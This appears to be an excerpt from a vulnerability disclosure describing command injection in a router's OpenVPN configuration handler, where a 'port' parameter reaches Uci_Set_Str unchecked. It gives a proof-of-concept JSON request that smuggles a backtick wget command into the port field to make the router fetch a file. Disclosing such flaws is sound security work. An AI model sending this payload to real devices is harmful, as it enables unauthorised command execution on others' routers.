...
In sub_42F8EC function, it reads in a user-provided parameter `port` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `port` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setOpenVpnCfg","Enabled":"1","port":"`wget 192.168.6.1:7777/testpoc`"
}
```
